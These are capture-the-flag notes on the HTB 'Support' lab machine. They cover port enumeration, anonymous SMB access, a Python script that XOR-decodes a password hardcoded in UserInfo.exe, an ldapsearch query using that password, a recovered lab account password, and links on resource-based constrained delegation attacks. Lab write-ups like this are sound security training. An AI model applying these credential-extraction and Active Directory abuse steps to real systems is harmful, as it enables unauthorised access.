# 1.Enum
open ports
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-11-17 10:23:04Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127

anonymous access is enabled in smb 
![[Pasted image 20221117125442.png]]
only support-tools is accessible
![[Pasted image 20221117125540.png]]
all content of the directory looks normal except UserInfo.exe.zip 
## 1.1 UserInfo.exe 
sending the binary to windows to enumerate it with dnspy 
![[Pasted image 20221215084328.png]]
![[Pasted image 20221215084342.png]]
reverse the code 
```python
import base64
 
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando".encode("UTF-8")
 
array = base64.b64decode(enc_password)
array2 = ""
 
for i in range(len(array)):
    array2 += chr(array[i] ^ key[i % len(key)] ^ 223)
 
print(array2)
```
```
result : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
![[Pasted image 20221215084434.png]]
DC=support,DC=htb
```
ldapsearch -x -H ldap://support.htb -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=support,CN=Users,DC=support,DC=htb"

```
![[Pasted image 20221215091629.png]]

support:Ironside47pleasure40Watchful
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
https://hakin9.org/rbcd-attack-kerberos-resource-based-constrained-delegation-attack-from-outside-using-impacket/